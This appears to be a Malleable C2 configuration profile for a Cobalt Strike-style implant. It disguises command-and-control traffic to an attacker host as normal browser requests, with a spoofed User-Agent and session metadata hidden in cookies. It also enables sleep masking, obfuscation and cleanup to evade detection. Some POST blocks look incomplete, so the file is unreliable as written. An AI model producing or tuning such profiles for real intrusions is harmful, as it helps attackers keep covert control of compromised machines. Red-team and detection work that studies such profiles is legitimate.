
# Malleable C2 Profile
#
# This profile is generated to configure C2 communications with customized HTTP GET/POST requests,
# metadata handling, URI rules, and SSL/TLS configurations.

set host "example.com";

https-certificate {
    set keystore "localhost.store";
    set password "pass123";
}

http-get {
    set uri "/news /about /contact";
    
    client {
        header "Host" "example.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59";
        header "Accept" "*/*";
        header "Referer" "http://example.com/";
        metadata {
            netbios;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/octet-stream";
        header "Connection" "Keep-Alive";
    }
}

http-post {
    set uri "/submit";
    
    client {
        id {
            netbios;
        }
        
        output {
            base64;
        }
    }
    
    server {
        header "Content-Type" "application/octet-stream";
        output {
            base64;
        }
    }
}

stage {
    set sleep_mask "true";
    set cleanup "true";
    set userwx "false";
}

process-inject {
    set startrwx "false";
    set userwx "false";
}

post-ex {
    set obfuscate "true";
    set cleanup "true";
}

# Sleep and Jitter configuration
set jitter "20";
set sleeptime "5000";
